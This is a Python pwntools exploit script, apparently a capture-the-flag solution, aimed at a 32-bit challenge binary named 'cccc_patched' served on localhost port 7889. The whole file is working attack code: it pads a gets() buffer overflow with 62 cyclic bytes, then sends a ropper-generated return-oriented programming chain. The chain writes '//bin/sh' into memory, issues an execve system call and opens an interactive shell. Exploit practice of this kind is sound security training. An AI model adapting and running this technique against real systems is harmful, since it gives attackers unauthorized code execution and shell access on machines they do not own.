from pwn import *

log.info("Iniciando el hackeo.")

remoteflag = 1
IP = 'localhost'    # change this
PORT = 7889         # change this
FILENAME = "./cccc_patched"
if remoteflag:
    io = remote(IP, PORT)
else:
    io = process(FILENAME)

elf = context.binary = ELF(FILENAME)

payload = b''
payload += cyclic(62)

# gets doesn't like newlines
# ropper --file cccc_patched --chain "execve cmd=/bin/sh" -b 0a
# yields newline-free ropchain

from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # f4f81392d808655c8dc6c8295b241b4fa67f70e3456b552d368d0b6cb8ee22c3
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += b'//bi'
rop += rebase_0(0x00001a7b) # 0x08049a7b: pop edi; ret; 
rop += rebase_0(0x00091000)
rop += rebase_0(0x00056fa1) # 0x0809efa1: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += b'n/sh'
rop += rebase_0(0x00001a7b) # 0x08049a7b: pop edi; ret; 
rop += rebase_0(0x00091004)
rop += rebase_0(0x00056fa1) # 0x0809efa1: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += p(0x00000000)
rop += rebase_0(0x00001a7b) # 0x08049a7b: pop edi; ret; 
rop += rebase_0(0x00091008)
rop += rebase_0(0x00056fa1) # 0x0809efa1: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000269b2) # 0x0806e9b2: pop ecx; pop ebx; ret; 
rop += rebase_0(0x00091008)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x00091000)
rop += rebase_0(0x0002698b) # 0x0806e98b: pop edx; ret; 
rop += rebase_0(0x00091008)
rop += rebase_0(0x0000034c) # 0x0804834c: pop ebp; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00011ce9) # 0x08059ce9: xchg eax, ebp; ret; 
rop += rebase_0(0x000272c0) # 0x0806f2c0: int 0x80; ret; 

payload += rop

io.sendline(payload)
io.interactive()
